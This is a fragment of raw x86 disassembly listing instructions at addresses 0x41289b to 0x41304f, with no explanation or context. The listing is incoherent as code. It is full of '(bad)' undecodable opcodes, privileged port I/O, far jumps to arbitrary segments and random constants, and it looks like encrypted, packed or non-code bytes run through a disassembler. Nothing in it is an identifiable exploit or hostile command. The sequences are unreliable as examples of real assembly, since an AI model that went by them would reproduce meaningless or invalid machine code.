  41289b:	mov    edx,0x44b0881a
  4128a0:	test   DWORD PTR [eax],ecx
  4128a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128a3:	jae    0x412861
  4128a5:	and    ch,cl
  4128a7:	inc    esi
  4128a8:	cmp    BYTE PTR [eax+0x1c],bh
  4128ab:	cmp    eax,0x66f010ac
  4128b0:	shl    DWORD PTR fs:[ebx-0x228a683e],1
  4128b7:	(bad)  
  4128b8:	sbb    eax,0x33c0d90b
  4128bd:	outs   dx,BYTE PTR ds:[esi]
  4128be:	and    DWORD PTR [eax-0x63],ecx
  4128c1:	cmp    eax,0xf5df899a
  4128c6:	stc    
  4128c7:	(bad)  
  4128c8:	stc    
  4128c9:	into   
  4128ca:	dec    di
  4128cc:	fstp   DWORD PTR [edi]
  4128ce:	fsub   QWORD PTR [ebx+0x61d30cf9]
  4128d4:	ret    
  4128d5:	and    BYTE PTR [ebp+0x79],dh
  4128d8:	das    
  4128d9:	mov    edx,0xae45803
  4128de:	xor    BYTE PTR [edx+0x4b126357],bh
  4128e4:	shl    ebp,0x90
  4128e7:	stc    
  4128e8:	enter  0xe7c4,0xa1
  4128ec:	idiv   esp
  4128ee:	jle    0x412876
  4128f0:	es pop edx
  4128f2:	mov    bh,0x24
  4128f4:	sbb    DWORD PTR [ecx+0x17f559bd],edi
  4128fa:	rcl    BYTE PTR [ebp+0x14],cl
  4128fd:	dec    esi
  4128fe:	shl    dh,1
  412900:	ss cmp al,0xb
  412903:	in     al,0xfa
  412905:	pop    ebx
  412906:	jae    0x412918
  412908:	adc    eax,0x6887555b
  41290d:	in     eax,0xbc
  41290f:	mov    eax,ds:0xd54de75a
  412914:	test   DWORD PTR [esi-0x23],ebx
  412917:	jp     0x4128b4
  412919:	or     BYTE PTR [edi],ah
  41291b:	imul   ecx,DWORD PTR [edi-0x26d674e1],0x733de54
  412925:	out    0x4d,al
  412927:	or     bl,BYTE PTR [ecx]
  412929:	in     eax,dx
  41292a:	or     edx,ecx
  41292c:	adc    eax,0x825feab8
  412931:	inc    DWORD PTR [esi-0x7c]
  412934:	pop    ecx
  412935:	sub    eax,DWORD PTR [ebx-0x7dada457]
  41293b:	outs   dx,BYTE PTR ds:[esi]
  41293c:	les    ebx,FWORD PTR [edx+0x6901db6c]
  412942:	push   ebx
  412943:	ret    0x54a3
  412946:	xchg   edx,eax
  412947:	lahf   
  412948:	jp     0x412923
  41294a:	(bad)  
  41294b:	sbb    esi,DWORD PTR [ecx-0x7979c77c]
  412951:	push   eax
  412952:	enter  0x6537,0x5f
  412956:	outs   dx,BYTE PTR ds:[esi]
  412957:	call   0xf3b65760
  41295c:	ins    DWORD PTR es:[edi],dx
  41295d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41295e:	xchg   edi,eax
  41295f:	dec    eax
  412960:	aam    0xcb
  412962:	mov    bh,0xf2
  412964:	je     0x412974
  412966:	(bad)  
  412967:	or     cl,ah
  412969:	pop    edi
  41296a:	fild   WORD PTR [ecx+0x7011f932]
  412970:	push   ebp
  412971:	pop    ss
  412972:	test   al,0xd5
  412974:	or     eax,DWORD PTR [ecx-0x77]
  412977:	inc    ebx
  412978:	and    al,0xb7
  41297a:	lahf   
  41297b:	stc    
  41297c:	je     0x412921
  41297e:	mov    ds:0xee97f156,al
  412983:	(bad)  
  412984:	pop    ebx
  412985:	and    BYTE PTR [esi+esi*2],ah
  412988:	push   ds
  412989:	add    al,0xbf
  41298b:	and    DWORD PTR [ebp+0x25],0x70af4964
  412992:	add    ch,BYTE PTR [ecx-0x4]
  412995:	mov    ch,0x9
  412997:	push   ss
  412998:	dec    ebp
  412999:	les    eax,FWORD PTR [edi+0x73]
  41299c:	or     ch,BYTE PTR [edx]
  41299e:	es ss popa 
  4129a1:	inc    edi
  4129a2:	sbb    esp,DWORD PTR [edi+0x44933788]
  4129a8:	int3   
  4129a9:	xlat   BYTE PTR ds:[ebx]
  4129aa:	sub    bl,cl
  4129ac:	xchg   ebp,eax
  4129ad:	rol    BYTE PTR ds:0x15d09dfa,cl
  4129b3:	and    al,BYTE PTR [edx-0x1ecbb4bb]
  4129b9:	mov    DWORD PTR [edi],ecx
  4129bb:	retf   
  4129bc:	sbb    bh,cl
  4129be:	mov    edi,0xddce9fc
  4129c3:	xchg   dl,dl
  4129c5:	cmp    DWORD PTR [eax+eax*4],eax
  4129c8:	div    BYTE PTR [esi-0x3f]
  4129cb:	mov    BYTE PTR [esi+0x5e15a389],bl
  4129d1:	mov    ebx,0xeb4827e4
  4129d6:	jl     0x41297d
  4129d8:	cwde   
  4129d9:	mov    cs,WORD PTR [ebx-0x22586239]
  4129df:	sbb    al,0xc3
  4129e1:	frstor [ecx+ecx*1]
  4129e4:	lods   eax,DWORD PTR ds:[esi]
  4129e5:	mov    ebp,0x75ab85e7
  4129ea:	inc    ecx
  4129eb:	add    eax,0x74d20ecc
  4129f0:	fld    TBYTE PTR [eax+0x52e6c7fa]
  4129f6:	dec    esi
  4129f7:	pop    esp
  4129f8:	push   ebp
  4129f9:	xor    ebx,esp
  4129fb:	icebp  
  4129fc:	mov    eax,0xc085767b
  412a01:	fdivr  DWORD PTR [edx+0x4d09df37]
  412a07:	sub    ch,BYTE PTR [eax]
  412a09:	call   0x996d1d5c
  412a0e:	dec    ebx
  412a0f:	outs   dx,DWORD PTR ds:[esi]
  412a10:	das    
  412a11:	pop    ebp
  412a12:	dec    ebx
  412a13:	neg    BYTE PTR [edx-0x55]
  412a16:	daa    
  412a17:	pop    ss
  412a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a19:	into   
  412a1a:	test   DWORD PTR [esi+0x18bc6443],edi
  412a20:	jbe    0x412a19
  412a22:	sub    DWORD PTR [ebx+0x1f],0xac182bd3
  412a29:	mov    ebx,0x1ddbb454
  412a2e:	push   es
  412a2f:	jae    0x4129bd
  412a31:	inc    edi
  412a32:	jp     0x412a99
  412a34:	js     0x412a25
  412a36:	push   edi
  412a37:	inc    esi
  412a38:	rcr    DWORD PTR [edi+0x6b93c75e],1
  412a3e:	sar    BYTE PTR [edx+0x71],0xa
  412a42:	mov    ah,0x91
  412a44:	pop    ebp
  412a45:	dec    si
  412a47:	push   ecx
  412a48:	nop
  412a49:	sbb    cl,BYTE PTR [edi-0x65ce810]
  412a4f:	cmp    eax,DWORD PTR [eax+0x28]
  412a52:	xchg   ebx,eax
  412a53:	retf   0x92d0
  412a56:	cmp    DWORD PTR [ecx],ecx
  412a58:	push   edi
  412a59:	dec    edi
  412a5a:	cmp    DWORD PTR [eax+ebx*8-0x2c9f7410],eax
  412a61:	inc    bl
  412a63:	add    al,0xe0
  412a65:	mov    dh,0x60
  412a67:	shl    BYTE PTR [ebp-0x124483bd],0x63
  412a6e:	jmp    0x4129f4
  412a70:	test   al,0xbc
  412a72:	ins    DWORD PTR es:[edi],dx
  412a73:	fidiv  WORD PTR [edx+0x5b]
  412a76:	or     ebx,DWORD PTR [edx]
  412a78:	aad    0xe4
  412a7a:	(bad)
  412a7d:	nop
  412a7e:	cli    
  412a7f:	test   eax,0x36a9c2
  412a84:	sub    DWORD PTR [ecx+eax*8],esp
  412a87:	add    esp,DWORD PTR [ebx-0x2f2742a1]
  412a8d:	jl     0x412aea
  412a8f:	stos   DWORD PTR es:[edi],eax
  412a90:	dec    esi
  412a91:	or     DWORD PTR [eax+0xa],eax
  412a94:	mov    ebx,0xd7460111
  412a99:	mov    al,0x47
  412a9b:	popa   
  412a9c:	loop   0x412aa3
  412a9e:	jb     0x412a52
  412aa0:	sub    edx,DWORD PTR [edi-0x2b744da5]
  412aa6:	xor    DWORD PTR [ebx],0xfaf486fc
  412aac:	fs iret 
  412aae:	enter  0xacbe,0x8f
  412ab2:	push   ecx
  412ab3:	adc    al,0x81
  412ab5:	adc    DWORD PTR [ebx+0x70c15621],esp
  412abb:	scas   eax,DWORD PTR es:[edi]
  412abc:	xor    al,BYTE PTR [edi+edx*2]
  412abf:	jmp    0xe490ec6d
  412ac4:	inc    esp
  412ac5:	hlt    
  412ac6:	call   0x9b207f5e
  412acb:	loop   0x412b29
  412acd:	sbb    eax,0x66be82ea
  412ad2:	inc    edi
  412ad3:	push   ecx
  412ad4:	bound  ecx,QWORD PTR [ecx-0x3b271d91]
  412ada:	cli    
  412adb:	out    0xc,eax
  412add:	sbb    BYTE PTR [esi-0x38],ah
  412ae0:	jmp    0xfd43:0x9d098f8b
  412ae7:	jmp    0x1ab:0x510c1d8e
  412aee:	add    al,0xb7
  412af0:	cmp    cl,bh
  412af2:	jge    0x412af8
  412af4:	das    
  412af5:	sbb    bh,0xda
  412af8:	test   ah,ah
  412afa:	push   ebp
  412afb:	push   es
  412afc:	mov    BYTE PTR [ebp-0x1a],cl
  412aff:	movhps xmm1,QWORD PTR ds:0xaea3d30
  412b06:	out    0x29,eax
  412b08:	out    dx,al
  412b09:	xchg   edx,eax
  412b0a:	jge    0x412acc
  412b0c:	pusha  
  412b0d:	outs   dx,BYTE PTR ds:[esi]
  412b0e:	es inc esi
  412b10:	(bad)  
  412b11:	dec    dl
  412b13:	hlt    
  412b14:	or     al,0x59
  412b16:	cmp    BYTE PTR [ecx-0x40],bh
  412b19:	mov    ebx,0xb46c9628
  412b1e:	push   ebp
  412b1f:	idiv   DWORD PTR [edx]
  412b21:	shr    BYTE PTR [edi],cl
  412b23:	sub    DWORD PTR [ecx],edi
  412b25:	sbb    DWORD PTR [ecx],edx
  412b27:	adc    eax,0x82e7399c
  412b2c:	pop    edx
  412b2d:	cmp    edi,eax
  412b2f:	adc    al,BYTE PTR [edx+eax*4+0xc]
  412b33:	shl    BYTE PTR [ecx],0x72
  412b36:	or     al,0x8a
  412b38:	pusha  
  412b39:	in     al,dx
  412b3a:	cmc    
  412b3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b3c:	das    
  412b3d:	dec    ebx
  412b3e:	jp     0x412b0a
  412b40:	add    al,0x6d
  412b42:	cli    
  412b43:	jecxz  0x412b07
  412b45:	inc    esp
  412b46:	inc    edx
  412b47:	int3   
  412b48:	adc    al,ah
  412b4a:	jb     0x412ba2
  412b4c:	in     al,dx
  412b4d:	xchg   ebp,eax
  412b4e:	or     al,0x95
  412b50:	lock cwde 
  412b52:	clc    
  412b53:	sbb    ebx,0x7f73d95d
  412b59:	or     edi,DWORD PTR [eax]
  412b5b:	arpl   WORD PTR [ebp-0x77824f05],dx
  412b61:	dec    eax
  412b62:	push   edi
  412b63:	push   ss
  412b64:	mov    ecx,0x5fdd836c
  412b69:	outs   dx,BYTE PTR ds:[esi]
  412b6a:	(bad)  
  412b6b:	push   ebp
  412b6c:	fwait
  412b6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b6e:	xor    cl,BYTE PTR [eax-0x22]
  412b71:	aas    
  412b72:	cli    
  412b73:	(bad)  
  412b74:	fcomp  QWORD PTR [ecx]
  412b76:	(bad)  
  412b77:	xchg   edi,eax
  412b78:	bound  ebx,QWORD PTR [ebx-0x56]
  412b7b:	aam    0x1f
  412b7d:	out    0x95,eax
  412b7f:	or     al,BYTE PTR [ebp+esi*8-0x2958acb1]
  412b86:	or     BYTE PTR [ebx-0x1b],dh
  412b89:	ret    0xff31
  412b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b8d:	mov    dl,cl
  412b8f:	push   esi
  412b90:	adc    DWORD PTR [edx+0x5],esi
  412b93:	lahf   
  412b94:	test   DWORD PTR [ebp-0x49],ecx
  412b97:	out    dx,al
  412b98:	arpl   dx,cx
  412b9a:	aad    0xbc
  412b9c:	jb     0x412be1
  412b9e:	arpl   WORD PTR [eax+eiz*8],ax
  412ba1:	cld    
  412ba2:	jne    0x412bcc
  412ba4:	lods   al,BYTE PTR ds:[esi]
  412ba5:	adc    BYTE PTR [esi+0x3f],dh
  412ba8:	push   eax
  412ba9:	fsubr  st,st(2)
  412bab:	adc    eax,0xb1c157f7
  412bb0:	lods   al,BYTE PTR ds:[esi]
  412bb1:	sub    esi,DWORD PTR [ebx+0x2b7226f1]
  412bb7:	rcl    BYTE PTR [edi-0x56],1
  412bba:	dec    esp
  412bbb:	test   BYTE PTR [eax-0x40cf9d90],dl
  412bc1:	ja     0x412b64
  412bc3:	sub    BYTE PTR [esi-0x21aa1ed5],ch
  412bc9:	clc    
  412bca:	mov    al,ds:0x4817a98d
  412bcf:	(bad)  
  412bd0:	das    
  412bd1:	add    DWORD PTR [esi+0x18],ebp
  412bd4:	imul   esp,DWORD PTR [ecx+edx*2+0xf],0xffffff9f
  412bd9:	test   eax,0x6253ca8
  412bde:	cmp    ch,BYTE PTR [edi-0x35162648]
  412be4:	xor    al,BYTE PTR [ebx+0x3c81c80b]
  412bea:	adc    cl,BYTE PTR [eax+0x32d7e901]
  412bf0:	push   ebp
  412bf1:	mov    esi,0x4ab2771f
  412bf6:	test   al,0x4e
  412bf8:	lods   eax,DWORD PTR ds:[esi]
  412bf9:	iret   
  412bfa:	bound  ebp,QWORD PTR [esp+eax*4]
  412bfd:	(bad)  
  412bfe:	stc    
  412bff:	xchg   esp,eax
  412c00:	cwde   
  412c01:	sbb    ecx,esi
  412c03:	shl    esp,1
  412c05:	out    0xca,al
  412c07:	daa    
  412c08:	adc    dl,bh
  412c0a:	cmc    
  412c0b:	fs out 0xc2,al
  412c0e:	pushf  
  412c0f:	push   esi
  412c10:	rcl    esp,0xe9
  412c13:	mov    cl,0x39
  412c15:	leave  
  412c16:	xchg   BYTE PTR [eax+0x42],bl
  412c19:	or     eax,0xc38c963f
  412c1e:	xchg   ebx,eax
  412c1f:	jle    0x412c4a
  412c21:	sar    bh,0x0
  412c24:	jmp    0x19bc:0xfc5c62ad
  412c2b:	xchg   DWORD PTR ds:0xb289a22,edx
  412c31:	or     al,ah
  412c33:	mov    esp,0x4c62fa0a
  412c38:	in     eax,0xc
  412c3a:	(bad)  
  412c3b:	in     al,0x4b
  412c3d:	jmp    0xdd:0xfd71bb61
  412c44:	push   esp
  412c45:	popa   
  412c46:	push   0xffffffcc
  412c48:	cdq    
  412c49:	cmp    DWORD PTR [ebp-0x65],0xca705acd
  412c50:	mov    al,0xb3
  412c52:	lea    esp,[edi-0x1e029388]
  412c58:	push   0x5cde340c
  412c5d:	jge    0x412c5d
  412c5f:	push   ds
  412c60:	imul   edx,DWORD PTR [esi+0x358bd2bb],0x10
  412c67:	lods   al,BYTE PTR ds:[esi]
  412c68:	or     eax,0x2630352e
  412c6d:	mov    al,ch
  412c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c70:	mov    dh,0xd8
  412c72:	lahf   
  412c73:	inc    ebp
  412c74:	pop    edi
  412c75:	out    dx,eax
  412c76:	cli    
  412c77:	cmp    BYTE PTR [edx-0x38],0xee
  412c7b:	xor    al,0x13
  412c7d:	jg     0x412c2a
  412c7f:	jge    0x412c8d
  412c81:	hlt    
  412c82:	(bad)  
  412c83:	xchg   esp,eax
  412c84:	mov    ebx,ebx
  412c86:	sub    eax,0x99f36905
  412c8b:	jle    0x412c5e
  412c8d:	js     0x412c9f
  412c8f:	std    
  412c90:	test   BYTE PTR [ebx],0xce
  412c93:	jae    0x412c82
  412c95:	cmp    bl,bl
  412c97:	dec    eax
  412c98:	dec    esi
  412c99:	push   eax
  412c9a:	push   0x7e
  412c9c:	(bad)  
  412c9d:	rol    BYTE PTR [ebp-0x357326af],1
  412ca3:	ss out dx,al
  412ca5:	(bad)  
  412ca8:	mov    ebp,0x8bdeb3fd
  412cad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cae:	fsub   DWORD PTR [ecx]
  412cb0:	into   
  412cb1:	push   0xb71a12dc
  412cb6:	inc    ebx
  412cb7:	ss daa 
  412cb9:	imul   ecx,DWORD PTR [ebx-0x34],0xffffff9e
  412cbd:	add    DWORD PTR [ecx+0x6d],edx
  412cc0:	fnstenv [edx-0x7436f789]
  412cc6:	clc    
  412cc7:	outs   dx,DWORD PTR ds:[esi]
  412cc8:	mul    DWORD PTR [ebx-0x4d]
  412ccb:	in     eax,0xc7
  412ccd:	das    
  412cce:	jno    0x412c9d
  412cd0:	mov    cs,WORD PTR [ecx-0x5fbe82cf]
  412cd6:	fs retf 0xc6cf
  412cda:	push   eax
  412cdb:	jbe    0x412d35
  412cdd:	dec    ebx
  412cde:	idiv   BYTE PTR ds:0xf5383373
  412ce4:	mov    cl,0x74
  412ce6:	pop    esp
  412ce7:	inc    ecx
  412ce8:	retf   0x22df
  412ceb:	jb     0x412cca
  412ced:	shl    DWORD PTR [esi+0x4b4a4a1d],cl
  412cf3:	lods   eax,DWORD PTR ds:[esi]
  412cf4:	jmp    ebx
  412cf6:	add    al,0xfc
  412cf8:	loop   0x412ca8
  412cfa:	sbb    ebp,DWORD PTR [ebp-0x6b68adb7]
  412d00:	clc    
  412d01:	icebp  
  412d02:	inc    ebp
  412d03:	adc    al,ah
  412d05:	pop    edi
  412d06:	(bad)  
  412d07:	dec    ebp
  412d08:	in     al,dx
  412d09:	sub    eax,0x4c732c22
  412d0e:	imul   ecx,esp,0xc91e65c2
  412d14:	cmp    BYTE PTR [ebx-0x5f],dl
  412d17:	int3   
  412d18:	icebp  
  412d19:	daa    
  412d1a:	test   dl,dl
  412d1c:	leave  
  412d1d:	hlt    
  412d1e:	push   ecx
  412d1f:	into   
  412d20:	jmp    0xc3f152c2
  412d25:	push   edi
  412d26:	scas   al,BYTE PTR es:[edi]
  412d27:	push   ds
  412d28:	jae    0x412cb5
  412d2a:	jo     0x412d10
  412d2c:	fs pop ecx
  412d2e:	fist   DWORD PTR [edi*4-0x1ba84f51]
  412d35:	jne    0x412d3c
  412d37:	pop    eax
  412d38:	mov    ds:0x3def3ef0,al
  412d3d:	ins    BYTE PTR es:[edi],dx
  412d3e:	test   al,0x3
  412d40:	mov    bh,0xb8
  412d42:	call   0x4f46:0x314508b3
  412d49:	aam    0x9b
  412d4b:	icebp  
  412d4c:	dec    ebx
  412d4d:	in     al,dx
  412d4e:	aad    0x40
  412d50:	pop    es
  412d51:	stos   DWORD PTR es:[edi],eax
  412d52:	in     al,0x3a
  412d54:	(bad)  
  412d55:	mov    ah,0x34
  412d57:	cwde   
  412d58:	mov    ch,0x3b
  412d5a:	mov    edx,0xddd71c5
  412d5f:	test   BYTE PTR [eax-0x74],ah
  412d62:	inc    ecx
  412d63:	sbb    ecx,DWORD PTR ds:[eax+0xdf11d5e]
  412d6a:	pop    ds
  412d6b:	in     al,dx
  412d6c:	shl    BYTE PTR [ebp+0x5bf197f9],cl
  412d72:	xor    eax,0x98c27104
  412d77:	mov    bh,0x17
  412d79:	mov    ebp,0xd07f9eeb
  412d7e:	loopne 0x412d4a
  412d80:	inc    esp
  412d81:	jmp    0xe593c8bf
  412d86:	cs popa 
  412d88:	sbb    eax,0xb22e321d
  412d8d:	ins    DWORD PTR es:[edi],dx
  412d8e:	push   ebx
  412d8f:	pop    esp
  412d90:	xchg   ebx,eax
  412d91:	mov    esi,0x98b7a201
  412d96:	mov    ecx,0x6507f57a
  412d9b:	pushf  
  412d9c:	aas    
  412d9d:	inc    ebx
  412d9e:	dec    esi
  412d9f:	(bad)  
  412da0:	(bad)  
  412da2:	call   0x6c31:0xded0c6f1
  412da9:	jo     0x412e14
  412dab:	xchg   ecx,eax
  412dac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dad:	(bad)  
  412dae:	push   ebx
  412daf:	les    ebx,FWORD PTR [ecx-0x6ad4f3dc]
  412db5:	add    BYTE PTR [esi-0x69],ch
  412db8:	(bad)  
  412db9:	in     eax,dx
  412dba:	sahf   
  412dbb:	retf   0x26c9
  412dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412dbf:	pop    eax
  412dc0:	jp     0x412dcb
  412dc2:	retf   
  412dc3:	ss push edx
  412dc5:	xlat   BYTE PTR ds:[ebx]
  412dc6:	sbb    ebx,DWORD PTR [eax]
  412dc8:	inc    ecx
  412dc9:	mov    esp,0xd6a8105c
  412dce:	push   0xf9c1fd04
  412dd3:	addr16 jl 0x412d64
  412dd6:	int3   
  412dd7:	aas    
  412dd8:	mov    eax,0x848d18cd
  412ddd:	data16 fnstcw WORD PTR [edi-0x16]
  412de1:	inc    ebp
  412de2:	loope  0x412e4a
  412de4:	pop    ds
  412de5:	repz inc ebx
  412de7:	sub    esi,DWORD PTR [eax+eiz*2]
  412dea:	dec    eax
  412deb:	pop    es
  412dec:	mov    eax,DWORD PTR [ebx+0x58]
  412def:	cwde   
  412df0:	inc    ecx
  412df1:	cmc    
  412df2:	(bad)  
  412df3:	shl    BYTE PTR [edx-0x3f57ee7f],cl
  412df9:	sub    al,0x83
  412dfb:	packsswb mm0,mm2
  412dfe:	aad    0xa7
  412e00:	add    al,0xc0
  412e02:	adc    edx,0x6b8b22a7
  412e08:	dec    esp
  412e09:	dec    esi
  412e0a:	or     dl,ah
  412e0c:	push   cs
  412e0d:	push   edx
  412e0e:	call   0xfaa9fed3
  412e13:	test   BYTE PTR [edi],bh
  412e15:	add    edx,DWORD PTR [esi+0x58]
  412e18:	pop    esi
  412e19:	jle    0x412e12
  412e1b:	cs pusha 
  412e1d:	xor    al,0x11
  412e1f:	cmp    eax,0x37c583ea
  412e24:	test   DWORD PTR [ebx+0x197674b0],esi
  412e2a:	push   esi
  412e2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e2c:	sub    BYTE PTR cs:[ebx+0x27ae0d8b],0x15
  412e34:	pushf  
  412e35:	(bad)  
  412e36:	fcom   QWORD PTR [ebp-0x21]
  412e39:	mov    ebx,0x15dd586
  412e3e:	jle    0x412e1f
  412e40:	adc    esi,DWORD PTR [eax+0x59]
  412e43:	sub    ecx,DWORD PTR [ecx]
  412e45:	xor    eax,0x11af3cae
  412e4a:	(bad)  
  412e4b:	pushf  
  412e4c:	sub    al,0xa3
  412e4e:	ins    BYTE PTR es:[edi],dx
  412e4f:	sub    BYTE PTR [eax-0x7e],cl
  412e52:	add    DWORD PTR [edx-0x6fe2685f],ecx
  412e58:	mov    eax,ds:0x8d0baf19
  412e5d:	mov    es,esp
  412e5f:	arpl   cx,si
  412e61:	(bad)  
  412e62:	fst    QWORD PTR ds:0xee970d2d
  412e68:	fstp   QWORD PTR [esi]
  412e6a:	fnstsw WORD PTR ds:0xf79dafda
  412e70:	stos   BYTE PTR es:[edi],al
  412e71:	data16 gs sahf 
  412e74:	scas   al,BYTE PTR es:[edi]
  412e75:	xchg   ebp,eax
  412e76:	inc    ebx
  412e77:	aam    0x42
  412e79:	sbb    ebx,DWORD PTR [ebp-0x1670fd6]
  412e7f:	fmul   QWORD PTR [edx+0x6d]
  412e82:	pop    es
  412e83:	add    BYTE PTR ds:0xb9926136,al
  412e89:	fs out 0xd0,al
  412e8c:	cmp    eax,0xf79c6e5b
  412e91:	xchg   ebx,ebp
  412e93:	xor    al,BYTE PTR ds:0xae73b9ea
  412e99:	xchg   esi,eax
  412e9a:	sbb    esp,DWORD PTR [ebp+ebp*4+0x1b32a162]
  412ea1:	outs   dx,DWORD PTR ds:[esi]
  412ea2:	nop    DWORD PTR [edi+edi*1-0x4b0e08c3]
  412eaa:	or     eax,DWORD PTR [ecx-0x3b]
  412ead:	adc    al,dl
  412eaf:	dec    edi
  412eb0:	in     eax,dx
  412eb1:	ja     0x412e6b
  412eb3:	add    al,0x95
  412eb5:	xchg   edx,eax
  412eb6:	dec    esi
  412eb7:	(bad)  
  412eb8:	ds (bad) 
  412eba:	rcr    DWORD PTR ds:0xd36d83b3,1
  412ec0:	test   al,0x37
  412ec2:	push   0xffffffbb
  412ec4:	cmp    BYTE PTR [esi],ah
  412ec6:	outs   dx,DWORD PTR ds:[esi]
  412ec7:	ret    0xf801
  412eca:	fisub  WORD PTR [edx]
  412ecc:	push   cs
  412ecd:	push   0x5c1f9dcd
  412ed2:	adc    eax,0xdaa0cb3b
  412ed7:	lods   al,BYTE PTR ds:[esi]
  412ed8:	inc    ebp
  412ed9:	div    edx
  412edb:	xchg   DWORD PTR ds:0x5c9dfb95,eax
  412ee1:	jle    0x412f24
  412ee3:	(bad)  
  412ee4:	fwait
  412ee5:	repnz sbb al,0x97
  412ee8:	imul   BYTE PTR [edx-0x1e60c141]
  412eee:	inc    eax
  412eef:	aad    0x5c
  412ef1:	iret   
  412ef2:	iret   
  412ef3:	imul   esi,DWORD PTR [eax-0x16],0x2e272c04
  412efa:	push   ds
  412efb:	into   
  412efc:	xchg   edi,eax
  412efd:	mov    cl,0xfd
  412eff:	sbb    ebx,eax
  412f01:	sbb    ch,BYTE PTR [eax-0x6c]
  412f04:	push   0x59b329f3
  412f09:	enter  0x4fe6,0x3d
  412f0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f0e:	mov    bl,BYTE PTR [ebp-0x372f9fdc]
  412f14:	mov    bh,0x2e
  412f16:	push   cs
  412f17:	ins    BYTE PTR es:[edi],dx
  412f18:	ss call 0xa7d0:0xa773d806
  412f20:	pop    es
  412f21:	mov    BYTE PTR [ebx-0x48c6e0d4],cl
  412f27:	xchg   esp,eax
  412f28:	ja     0x412efe
  412f2a:	mov    ds:0x48b6d238,al
  412f2f:	adc    BYTE PTR [esi],ch
  412f31:	xor    BYTE PTR [edi],0x70
  412f34:	mov    bh,0xa4
  412f36:	jnp    0x412f89
  412f38:	inc    esp
  412f39:	data16 sub BYTE PTR [ebp+0x51759a43],al
  412f40:	(bad)  
  412f41:	cld    
  412f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f43:	fnstenv [esi+ebp*1+0x2f]
  412f47:	or     al,0xee
  412f49:	pop    ebp
  412f4a:	ror    BYTE PTR [ebx],cl
  412f4c:	loop   0x412f22
  412f4e:	mov    WORD PTR [edx-0x76],gs
  412f51:	xor    DWORD PTR [esi+0x29e777bf],ecx
  412f57:	xchg   DWORD PTR [ebx+0x6],ecx
  412f5a:	stc    
  412f5b:	fnstenv [ebx-0xa9ec932]
  412f61:	in     eax,0x7b
  412f63:	clc    
  412f64:	xlat   BYTE PTR ds:[ebx]
  412f65:	add    BYTE PTR [ebx+0x79],0xb6
  412f69:	pop    ecx
  412f6a:	push   ecx
  412f6b:	cwde   
  412f6c:	int    0xcf
  412f6e:	xlat   BYTE PTR ds:[ebx]
  412f6f:	mov    dl,0xda
  412f71:	and    al,0xad
  412f73:	adc    eax,0xd8f89476
  412f78:	in     al,0x96
  412f7a:	mov    ecx,0xbad315c5
  412f7f:	mov    ds:0x240553fa,al
  412f84:	test   cl,al
  412f86:	jg     0x412f36
  412f88:	aas    
  412f89:	test   BYTE PTR [edi+0x12],bh
  412f8c:	mov    edx,edx
  412f8e:	inc    eax
  412f8f:	rcl    BYTE PTR [eax+ebx*4+0x74],cl
  412f93:	fnstsw ax
  412f95:	pushf  
  412f96:	push   ds
  412f97:	jmp    0xd7f4:0x70b6b12e
  412f9e:	mov    esi,0xf40a35ab
  412fa3:	out    0x72,eax
  412fa5:	jae    0x412fbb
  412fa7:	int3   
  412fa8:	mov    bh,bh
  412faa:	scas   al,BYTE PTR es:[edi]
  412fab:	dec    ebp
  412fac:	sub    esi,DWORD PTR [ebx-0x5]
  412faf:	fcom   QWORD PTR [ebp-0x8]
  412fb2:	(bad)  
  412fb3:	cmp    bh,bh
  412fb5:	fs gs (bad) 
  412fb8:	mov    dh,0xcb
  412fba:	test   eax,0x88a7a04f
  412fbf:	popf   
  412fc0:	out    0x40,eax
  412fc2:	pop    ebx
  412fc3:	push   es
  412fc4:	mov    cl,0x0
  412fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fc7:	aaa    
  412fc8:	mov    eax,0xd65ba9fb
  412fcd:	and    DWORD PTR [ecx-0x18533fa2],eax
  412fd3:	mov    eax,ds:0xc439277e
  412fd8:	add    al,0x9
  412fda:	dec    ebp
  412fdb:	sbb    eax,edx
  412fdd:	out    dx,eax
  412fde:	gs cmp al,0x2b
  412fe1:	cmc    
  412fe2:	adc    edi,DWORD PTR cs:[esi+0x18]
  412fe6:	push   esi
  412fe7:	or     ah,BYTE PTR [ebp+0x79]
  412fea:	ficom  DWORD PTR [ebp+esi*4+0x5cadca26]
  412ff1:	jmp    0x8b864553
  412ff6:	jmp    0x929a:0x4e27612b
  412ffd:	fs jnp 0x41305d
  413000:	out    dx,al
  413001:	sbb    al,al
  413003:	xchg   dh,bh
  413005:	inc    ecx
  413006:	inc    ebx
  413007:	cmp    bh,BYTE PTR [edx]
  413009:	sbb    dl,BYTE PTR ds:0x42bd17a0
  41300f:	sahf   
  413010:	push   esp
  413011:	xchg   DWORD PTR [ecx],edx
  413013:	cmp    BYTE PTR [ecx],0xd3
  413016:	push   ss
  413017:	jb     0x413020
  413019:	xchg   ebx,eax
  41301a:	in     al,dx
  41301b:	jg     0x412fc2
  41301d:	movq   mm7,QWORD PTR [edx+0x64]
  413021:	das    
  413022:	gs push esp
  413024:	inc    ecx
  413025:	div    BYTE PTR [edi-0x193dcd1f]
  41302b:	jne    0x412fd4
  41302d:	sub    BYTE PTR [ecx-0x50],dl
  413030:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413031:	xor    DWORD PTR ds:0x1da65090,ebp
  413037:	es jnp 0x413093
  41303a:	lods   al,BYTE PTR cs:[esi]
  41303c:	jnp    0x41308a
  41303e:	enter  0x1d12,0xcb
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    DWORD PTR es:[edi],dx
  413044:	sub    DWORD PTR [edi],esi
  413046:	dec    dh
  413048:	xchg   ebx,eax
  413049:	mov    ds:0x767ed53c,eax
  41304e:	(bad)  
  41304f:	sahf   
